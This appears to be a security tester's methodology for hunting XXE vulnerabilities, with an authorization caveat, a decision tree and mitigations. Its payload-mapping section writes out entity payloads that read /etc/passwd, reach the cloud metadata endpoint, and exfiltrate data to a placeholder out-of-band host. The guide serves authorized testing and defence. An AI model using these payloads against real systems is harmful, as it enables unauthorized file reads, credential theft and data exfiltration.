### XXE Hunt Methodology

Use only with explicit authorization. This flow helps find classic and blind XXE, parameter entities, external DTDs, XInclude, and SVG-based XXE.

---

## Decision tree: question-driven XXE hunting

1) Where is XML processed?
- Stock check endpoints, SOAP/XML APIs, file uploads (SVG, XML, DOCX, XLSX, PPTX, PDF forms), SAML/metadata, RSS/Atom.

2) Can you inject or fully control XML?
- Raw XML body? URL-encoded parameter that feeds an XML node? Multipart XML part? Try breaking with `]]>` or malformed tags to surface XML parser errors.

3) Parser behavior and defenses
- Entities allowed? If blocked, try parameter entities (`<!ENTITY % ...>`). Are external DTDs fetched? Network egress allowed?
- Error verbosity: do errors reflect entity expansion or internal file paths?

4) Pick approach by visibility
- In-band file read (entities/XInclude) → report contents in response.
- Blind/OOB (external entity/DTD) → use Collaborator/OAST callbacks.
- Error-based exfil → append content into an error via non-existent resource.

5) Payload families (see `XXE/wordlists/` and `XXE/pocs/`)
- Read local file: internal subset entity; XInclude.
- SSRF: external entity to metadata (169.254.169.254), internal services.
- Blind/OOB: external entity to OAST, or external DTD with stacked entities.
- Parameter entities: `%xxe;` to bypass entity bans.
- External DTD data exfil: build `%file`, `%eval`, `%exfil` chain.

6) Confirm and pivot
- For blind: observe DNS/HTTP hits; for in-band: verify file content markers.
- If entities banned, try parameter DTD; if network blocked, prefer XInclude / local entity.

---

## Quick payload mapping

- Read file (internal entity): `<!ENTITY xxe SYSTEM "file:///etc/passwd"> ... &xxe;`
- SSRF (entity): `<!ENTITY xxe SYSTEM "http://169.254.169.254/..."> ... &xxe;`
- Blind OOB: `<!ENTITY xxe SYSTEM "http://YOUR-OAST"> ... &xxe;`
- Parameter entity OOB: `<!ENTITY % xxe SYSTEM "http://YOUR-OAST"> %xxe;`
- External DTD exfil (stacked): host DTD with `%file`, `%eval`, `%exfil`.
- XInclude: `<xi:include parse="text" href="file:///etc/passwd"/>` with `xmlns:xi`.
- SVG: entity in internal subset then reference in `<text>`.

---

## Reporting/mitigation

- Disable DTDs/external entities in XML parsers; use safe parsers.
- For SAML/XML-based flows, validate schema strictly; avoid dynamic entity expansion.
- Block egress to metadata endpoints; segment internal services.
- Sanitize uploads and SVG processing; prefer image transcoders.


